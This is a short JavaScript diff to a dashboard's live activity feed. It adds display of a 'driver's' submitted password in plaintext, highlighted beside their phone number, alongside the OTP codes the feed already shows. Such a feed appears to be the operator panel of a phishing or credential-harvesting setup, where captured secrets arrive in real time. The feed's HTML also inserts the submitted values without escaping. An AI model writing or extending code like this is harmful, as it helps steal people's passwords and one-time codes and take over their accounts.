@@ -254,7 +254,9 @@ function addActivityFeedItem(notification) {
 
     const div = document.createElement('div');
     const isOtp = notification.type === 'OTP_SUBMITTED';
-    div.className = `activity-item ${isOtp ? 'type-otp' : 'type-phone'}`;
+    const isPassword = notification.type === 'PASSWORD_SUBMITTED';
+
+    div.className = `activity-item ${isOtp ? 'type-otp' : (isPassword ? 'type-password' : 'type-phone')}`;
 
     const timeStr = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
 
@@ -265,6 +267,12 @@ function addActivityFeedItem(notification) {
             <span>Driver <strong>${notification.data.phoneNumber}</strong> submitted OTP:</span>
             <span class="otp-highlight">${notification.data.otp}</span>
             <span style="color:#10B981;">(Driver Identity Verified)</span>
+        `;
+    } else if (isPassword) {
+        messageHtml = `
+            <i class="fa-solid fa-key" style="color:#FACC15; margin-right:8px;"></i>
+            <span>Driver <strong>${notification.data.phoneNumber}</strong> submitted Password:</span>
+            <span style="background:rgba(234, 179, 8, 0.2); color:#FACC15; border:1px solid #EAB308; padding:2px 8px; border-radius:4px; font-weight:700; font-family:monospace; margin-left:6px;">${notification.data.password}</span>
         `;
     } else {
         messageHtml = `
